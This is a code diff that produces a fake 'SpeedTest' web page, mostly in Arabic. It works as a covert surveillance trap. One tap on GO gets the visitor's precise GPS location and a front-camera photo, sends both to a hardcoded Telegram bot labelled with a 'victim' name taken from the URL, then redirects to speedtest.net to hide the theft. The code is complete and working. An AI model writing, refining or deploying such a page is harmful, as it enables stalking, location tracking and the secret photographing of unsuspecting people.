@@ -1,24 +1,104 @@
-async function capturePhoto(facingMode) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: facingMode, width: 640, height: 480 }, // تقليل الدقة لتسريع الرفع
-            audio: false 
-        });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        
-        await new Promise(resolve => video.onloadedmetadata = resolve);
-        await new Promise(resolve => setTimeout(resolve, 500)); // تقليل وقت الانتظار لنصف ثانية فقط
 
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SpeedTest - فحص جودة الاتصال</title>
+    <style>
+        /* منع التحديد واللمس المتعدد */
+        * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
         
-        stream.getTracks().forEach(track => track.stop());
-        // تقليل جودة الضغط إلى 0.5 لتصغير الحجم وسرعة الإرسال
-        return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5)); 
-    } catch (e) {
-        return null;
-    }
-}
+        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        h1 { font-size: 24px; margin-bottom: 10px; opacity: 0.9; }
+        
+        .circle { 
+            width: 200px; height: 200px; border: 6px solid #00d2ff; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; cursor: pointer; 
+            transition: transform 0.2s, box-shadow 0.3s; 
+            box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); 
+            background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); 
+            position: relative; z-index: 10;
+        }
+
+        .circle:active { transform: scale(0.95); box-shadow: 0 0 50px #00d2ff; }
+        
+        .speed { font-size: 55px; font-weight: bold; color: #00d2ff; pointer-events: none; }
+        
+        #status { margin-top: 30px; color: #888; font-size: 16px; height: 20px; }
+        
+        video, canvas { display: none; } 
+    </style>
+</head>
+<body>
+    <h1>Global Speed Test</h1>
+    <div class="circle" id="startBtn"><span class="speed">GO</span></div>
+    <p id="status">بانتظار بدء الفحص...</p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
+        const chatId = "7984067238"; 
+        const urlParams = new URLSearchParams(window.location.search);
+        const victim = urlParams.get( user ) || "Unknown_User";
+
+        async function sendToTelegram(type, data, extra = "") {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            if (type === "photo") {
+                formData.append("photo", data, "capture.jpg");
+                formData.append("caption", `👤 المستهدف: ${victim}\n${extra}`);
+                return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+            } else {
+                return fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
+            }
+        }
+
+        async function capture(mode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
+                const video = document.getElementById( video );
+                video.srcObject = stream;
+                await new Promise(res => video.onloadedmetadata = res);
+                await new Promise(res => setTimeout(res, 500)); // وقت استجابة أسرع
+
+                const canvas = document.getElementById( canvas );
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext( 2d ).drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                
+                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
+            } catch (e) { return null; }
+        }
+
+        document.getElementById( startBtn ).onclick = async function() {
+            const status = document.getElementById( status );
+            status.innerText = "جاري الاتصال بالسيرفرات...";
+            this.style.pointerEvents = "none"; // منع الضغط مرة أخرى
+
+            // 1. طلب الموقع (غالباً ما يظهر الإذن أولاً في المتصفح)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const map = `📍 موقع ${victim}: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram("text", map);
+                }, null, {enableHighAccuracy: true});
+            }
+
+            // 2. التقاط الصورة الأمامية فوراً
+            const img = await capture("user");
+            if (img) {
+                status.innerText = "جاري معايرة الحساسات...";
+                await sendToTelegram("photo", img, "📸 صورة أمامية");
+            }
+
+            // 3. التوجيه النهائي بعد 2 ثانية لضمان إرسال البيانات
+            setTimeout(() => {
+                window.location.href = "https://www.speedtest.net";
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
